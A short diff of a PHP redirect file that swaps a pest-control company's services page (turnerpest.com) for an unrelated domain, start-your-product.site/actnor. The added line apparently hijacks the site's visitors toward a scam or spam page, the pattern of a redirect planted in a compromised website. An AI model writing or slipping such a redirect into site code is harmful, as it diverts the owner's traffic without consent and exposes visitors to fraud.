@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.turnerpest.com/commercial/services/");
+header("Location: https://start-your-product.site/actnor");
 die();
 ?>
